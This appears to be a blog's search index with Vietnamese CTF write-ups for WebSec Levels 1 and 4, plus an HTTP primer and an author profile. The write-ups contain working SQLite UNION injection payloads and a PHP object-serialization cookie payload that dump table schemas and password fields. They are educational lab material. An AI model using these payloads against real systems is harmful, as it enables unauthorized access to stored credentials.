<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PwnFox Extension on Firefox for Pentester</title>
    <link href="/2022/07/20/PwnFox/"/>
    <url>/2022/07/20/PwnFox/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Technical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>extension</tag>
      
      <tag>pwnfox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 4</title>
    <link href="/2022/07/19/Level4/"/>
    <url>/2022/07/19/Level4/</url>
    
    <content type="html"><![CDATA[<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Challenge này có chỗ input là id, nhưng không giống như Level 1 là sẽ ra lỗi khi nhập ký tự đặc biệt.</p><p>Với giá trị cookie leet_hax0r: Decode base64 ra thì là một dạng json sau khi <a href="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html"><span style="color:#FF4500">serialize</span></a>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ip&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;116.96.78.101&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Challenge cho 2 source code, nhưng chú ý trong source 1 là viết ở dạng OOP, có các <a href="https://www.php.net/manual/en/language.oop5.magic.php"><span style="color:#FF4500">Magic Methods</span></a> được dùng như <code>__construct()</code>, <code>__destruct()</code>.</p><ul><li><p><code>__construct()</code>: hàm này được gọi khi khởi tạo một đối tượng.</p></li><li><p><code>__destruct()</code>: hàm này được gọi khi đối tượng bị xoá đi. Khi nó không tham chiếu đến đối tượng deserialize tồn tại.</p></li></ul><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image1.png"></th></tr></thead><tbody><tr><td align="center"><i>Source code 1</td></tr></tbody></table><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image2.png"></th></tr></thead><tbody><tr><td align="center"><i>Source code 2</td></tr></tbody></table><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Để ý dòng code ở source 2. Thì giá trị cookie leet_hax0r được encode base64.</p><p>Mình sẽ tạo dòng Code giống class SQL để serialize nó.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>Sau khi bulid source xong, run code sẽ ra Object và đoạn base64 như sau:</p><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image3.png"></th></tr></thead><tbody><tr><td align="center"><i>serialize SQL Object</td></tr></tbody></table><p>Copy đoạn base64 thay thế giá trị cookie leet_hax0r, sau đó gửi reuqest:</p><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image4.png"></th></tr></thead><tbody><tr><td align="center"><i>Cấu trúc câu query được dùng</td></tr></tbody></table><p>Kiểm tra xem còn table nào ngoài users không? Kết quả là không còn table nào khác.</p><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image5.png"></th></tr></thead><tbody><tr><td align="center"><i>Check another table</td></tr></tbody></table><p>Mình đoán là Flag nằm ở password, nên sẽ select password ra.</p><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image6.png"></th></tr></thead><tbody><tr><td align="center"><i>Payload get flag</td></tr></tbody></table><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv4/image7.png"></th></tr></thead><tbody><tr><td align="center"><i>Got the flag</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>level</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 2</title>
    <link href="/2022/07/19/Level2/"/>
    <url>/2022/07/19/Level2/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/CommingSoon.jpeg"></p><h2 id="Hi-…"><a href="#Hi-…" class="headerlink" title="Hi …"></a><p style="color:orange">Hi …</p></h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>level</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 1</title>
    <link href="/2022/07/19/Level1/"/>
    <url>/2022/07/19/Level1/</url>
    
    <content type="html"><![CDATA[<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Sau khi nhìn sơ qua bối cảnh challenge, thì có 1 chỗ input là số để xem thông tin ID.<br>Và challenge cũng đã cho source sẵn:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelOne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br>        <br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Với đoạn code trên, tại dòng 5. Nếu như mình truyền vào là dấu ‘, chữ cái, kí tự đặc biệt thì sẽ báo lỗi.</p><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv1/image1.png"></th></tr></thead><tbody><tr><td align="center"><i>Lỗi khi nhập chữ a</td></tr></tbody></table><p>Với source code và thông báo lỗi, mình xác định được đây là lỗi SQL injection trên SQLite3.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Vì ID kiểu dữ liệu thường là số, nên mình sẽ dùng kỹ thuật khai thác là <a href="https://sechow.com/bricks/docs/content-page-1.html"><span style="color:#FF4500">UNION</span></a>.</p><ul><li>Kiểm tra số cột được select.</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1 order by 2 ==&gt; OK<br>1 order by 3 ==&gt; ERROR<br></code></pre></td></tr></table></figure><p>Vậy là có 2 cột được select.</p><p>Tiếp theo cần xem các cột đó là gì.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(id <span class="hljs-type">int</span>(<span class="hljs-number">7</span>), username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image2.png"></p><p>Xác định được table là users và các cột là id, username, password.</p><p>Tìm xem còn table nào ngoài users hay không?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(tbl_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;table&#x27;</span> <span class="hljs-keyword">and</span> tbl_name <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sqlite_%&#x27;</span><br></code></pre></td></tr></table></figure><p>Cuối cùng get flag thôi.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;flag&quot;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center"><img src="/img/CTF/WebSec/lv1/image3.png"></th></tr></thead><tbody><tr><td align="center"><i>Flag</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>level</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP⁄HTTPS</title>
    <link href="/2022/07/19/HTTP%E2%81%84HTTPS/"/>
    <url>/2022/07/19/HTTP%E2%81%84HTTPS/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h1><p>Created: June 20, 2021 8:30 AM<br>Status: Complete</p><p><img src="/img/Security/url.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Hypertext Transfer Protocol (giao thức truyền tải siêu văn bản).</p><p>Dùng port: 80</p><p>Giao thức cơ bản dùng cho World Wide Web (www) để truyền dữ liệu dưới dạng văn bản, hình ảnh, âm thanh từ webserver đến các trình duyệt và ngược lại.</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>Hypertext Transfer Protocol Secure.</p><p>Dùng port: 443&#x2F;4433</p><p>Dữ liệu chuyển từ Webserver đến trình duyệt không được mã hóa, dễ bị đánh cắp. Giao thức https dùng SSL (secure sockets layer - lớp cổng bảo mật) để mã hóa dữ liệu giữa website và web browser. Hiện tại SSL không còn được sử dụng nữa, chuyển sang TSL (Transport Security Layer), giống như SSL. </p><p><img src="/img/Security/http.png"></p><h2 id="HTTP-Status-Code"><a href="#HTTP-Status-Code" class="headerlink" title="HTTP Status Code"></a>HTTP Status Code</h2><ul><li>100-199: Information <em>(100: Continue; 101: Switching protocols)</em>.</li><li>200-299: Successes <em>(200 OK is the “normal” response for a GET; 201: Created; 201: Accepted; 203: Non-authoritative information; 204: No content; 205: Reset content; 206: Partial content)</em></li><li>300-399: Redirects <em>(the information you want is elsewhere’ 301: Moved permanently; 302: Moved temporarily; 304: Not modified)</em></li><li>400-499: Client errors <em>(You did something wrong, like asking for something that doesn’t exist; 403: forbidden; 404: not found; 405: Method not allowed; …)</em></li><li>500-599: Server errors <em>(The server tried, but something went wrong on their side; 500: internal server error; 501: Not implemented; 502: Bad gateway; 505: Gateway timeout)</em></li></ul><p><strong>Vi du</strong></p><ul><li>201 Created – Trả về khi một Resouce vừa được tạo thành công.</li><li>204 No Content – Trả về khi Resource xoá thành công.</li><li>304 Not Modified – Client có thể sử dụng dữ liệu cache.</li><li>400 Bad Request – Request không hợp lệ</li><li>401 Unauthorized – Request cần có auth.</li><li>403 Forbidden – bị từ chối không cho phép.</li><li>404 Not Found – Không tìm thấy resource từ URI</li><li>405 Method Not Allowed – Phương thức không cho phép với user hiện tại.</li><li>410 Gone – Resource không còn tồn tại, Version cũ đã không còn hỗ trợ.</li><li>415 Unsupported Media Type – Không hỗ trợ kiểu Resource này.</li><li>422 Unprocessable Entity – Dữ liệu không được xác thực</li><li>429 Too Many Requests – Request bị từ chối do bị giới hạn</li></ul><p><strong>HTTP Request methods (HTTP Verb Tampering)</strong></p><p><strong>GET</strong>: lấy thông tin từ server đã cung cấp từ url. (Các yêu cầu GET ko ảnh hướng đến dữ liệu).</p><p><strong>HEAD</strong>: tương tự GET, nhưng có thêm trạng thái và khu vực Header.</p><p><strong>POST</strong>: yêu cầu gửi dữ liệu đến server. (vd: thông tin khách hàng, file tải lên, ..), sử dụng các thẻ HTML.</p><p><strong>PUT</strong>: thay đổi tất cả các đại diện của nguồn với nội dung được tải lên.</p><p><strong>DELETE</strong>: gỡ bỏ tất cả các đại diện của nguồn bởi URL.</p><p><strong>CONNECT</strong>: thiết lập một tunnel tới server được xác định bởi URl đã cấp.</p><p><strong>OPTIONS</strong>: miêu tả chức năng giao tiếp cho nguồn mục tiêu.</p><p><strong>TRACE</strong>: trình bày vòng lặp kiểm tra thông báo song song với path tới resource.</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h2 id="Hello-my-friends-I’m-a-student-and-a-pentester"><a href="#Hello-my-friends-I’m-a-student-and-a-pentester" class="headerlink" title="Hello my friends, I’m a student and a pentester"></a><p align="center" style="color:#2ECC71"><strong>Hello my friends, I’m a student and a pentester</strong></p></h2><hr><div style="text-align:center"><img alt="Khado" src="https://github.com/dovankha/dovankha.github.io/blob/master/img/hinhKha.jpg?raw=true"/></div><blockquote><p>Email: <a href="mailto:&#x64;&#111;&#118;&#x61;&#x6e;&#x6b;&#x68;&#97;&#46;&#x74;&#x6c;&#118;&#x6e;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;">&#x64;&#111;&#118;&#x61;&#x6e;&#x6b;&#x68;&#97;&#46;&#x74;&#x6c;&#118;&#x6e;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;</a></p></blockquote><hr><h3 id="Education"><a href="#Education" class="headerlink" title="Education"></a><strong>Education</strong></h3><ul><li>09&#x2F;2019 - Present: Posts and Telecommunications Institute of Technology.</li><li>Major: Information Technology.</li></ul><hr><h3 id="Experience"><a href="#Experience" class="headerlink" title="Experience"></a><strong>Experience</strong></h3><ul><li>02&#x2F;2022 - 06&#x2F;2022: Intern in Penetration Testing at <a href="https://www.vietsunshine.com.vn/"><span style="color:#FF4500">VietSunshine</span></a> Company.</li></ul><hr><h3 id="Activities"><a href="#Activities" class="headerlink" title="Activities"></a><strong>Activities</strong></h3><ul><li>Chủ nhiệm <a href="https://www.facebook.com/PISClub"><span style="color:#FF4500">CLB An toàn thông tin</span></a> nhiệm kỳ 2022 - 2023.</li><li>Cán bộ Đoàn xuất sắc <a href="https://www.facebook.com/lcdattt"><span style="color:#FF4500">LCĐ An toàn thông tin</span></a> từ 2019 - 2022.</li><li>Đã tham gia lớp cảm tình Đảng năm 2021.</li></ul><hr><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a><strong>Certificate</strong></h3><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center"><img src="/img/ChungNhan/2019.jpg" alt="2019"></td><td align="center"><img src="/img/ChungNhan/2020.jpg" alt="2020"></td></tr><tr><td align="center">2019-2020</td><td align="center">2020-2021</td></tr><tr><td align="center"><img src="/img/ChungNhan/2021.jpg" alt="2021"></td><td align="center"><img src="/img/ChungNhan/Dang.jpg" alt="Dang"></td></tr><tr><td align="center">2021-2022</td><td align="center">Cảm tình Đảng</td></tr></tbody></table>]]></content>
    
  </entry>
  
  
  
</search>
